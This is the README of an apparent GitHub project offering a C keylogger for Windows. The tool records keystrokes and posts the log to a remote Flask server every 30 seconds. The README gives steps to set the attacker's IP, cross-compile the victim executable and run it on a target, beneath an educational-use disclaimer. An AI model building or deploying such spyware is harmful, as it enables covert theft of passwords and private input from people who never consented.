
# 🖥️ Windows Keylogger Proof of Concept

A simple Windows-based keylogger developed in C, capturing keyboard strokes in real-time, storing them locally, and uploading the log file to a remote Flask server every 30 seconds for analysis.

---

## 📌 Features

- ✅ Records every keystroke typed on the machine  
- ✅ Saves all keystrokes to a local `keys.log` file  
- ✅ Automatically uploads the log file to a remote server via HTTP POST  
- ✅ Deletes local log file after successful upload  
- ✅ Minimal, native implementation using WinHTTP API  

---

## ⚠️ Disclaimer

This project is built strictly for **educational and security research purposes**.  
**Do not use this tool on systems you do not own or have explicit permission to test.** Unauthorized use is illegal and unethical.

---

## 📷 Demo

![keyloger](https://github.com/Sergeb250/Windows_KeyLogger/blob/e82d3122af87a577cac28aeaa64a9375153e1363/Screenshot%202025-06-17%20193924.png)

---

## 📑 Requirements

- Windows OS  
- C compiler (MSVC or MinGW)
- Python 3 (for the Flask server)

---

## 📦 Usage

### 📌 Server (Python)

```bash
sudo python3 server.py
```
📌 GENERATING ViCTIM's .exe (Windows C program)

 Configure the Client (Windows Keylogger)
Before compiling the C program, edit the following line in KeyloggerV3.c:

```c

#define SERVER_NAME L"192.168.43.178"
```
➡️ Replace 192.168.43.178 with your attacker's/server machine IP address.
Compile using:

```bash

sudo x86_64-w64-mingw32-gcc -o keylogger.exe KelogerV2.c -lwinhttp

```
Run KeyloggerV3.exe on target machine (for authorized testing only)

👤 Author

Serge Benit

📧 haksergeb@gmail.com

📱 +250 791 822 315

🌐 GitHub: Sergeb250
